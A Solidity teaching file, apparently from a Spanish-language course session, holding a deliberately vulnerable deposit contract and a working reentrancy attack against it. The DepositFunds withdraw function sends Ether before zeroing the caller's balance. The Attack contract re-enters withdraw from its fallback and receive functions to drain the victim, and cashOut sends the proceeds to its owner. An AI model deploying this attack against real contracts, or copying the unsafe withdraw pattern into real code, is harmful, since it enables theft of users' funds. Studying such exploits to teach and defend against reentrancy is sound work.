//"SPDX-License-Identifier: UNLICENSED"
pragma solidity ^0.8.0;

// Sesion 5

contract DepositFunds {
    mapping(address => uint) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public returns (bool, bytes memory) {
        uint bal = balances[msg.sender];
        require(bal > 0, "No tienes balance que retirar");
        // (bool sent, ) = msg.sender.call{value: bal}("hola te envio tu valor"); // si no te ineresa el BYTE se pone asi
        // ( , bytes memory data) = msg.sender.call{value: bal}("hola te envio tu valor"); // si no te interesa el BOOL se pone asi
        (bool sent, bytes memory data) = msg.sender.call{value: bal}("hola te envio tu valor"); //si me interesa el BOOL y BYTE
        balances[msg.sender] = 0;
        return (sent, data);
    }

    function getTotalBalance () public view returns(uint256) {
        return address(this).balance;
    }


    receive() external payable {}

}

contract Attack {
    DepositFunds public  depositFunds;
    address payable owner;

    constructor(address payable  _depositFundsAddress) {
        depositFunds = DepositFunds(_depositFundsAddress);
        owner = payable(msg.sender);
    }
    
    fallback() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
    }

    receive() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
    }

    

    function attack() external payable {
        require(msg.value >= 1 ether, "Enviar mas valor");
        depositFunds.deposit{value: msg.value}();
        depositFunds.withdraw();
    }

    function getTotalBalance () public view returns(uint256) {
        return address(this).balance;
    }

    function cashOut () public payable{
        uint256 balance =getTotalBalance();
        owner.transfer(balance);
    }

}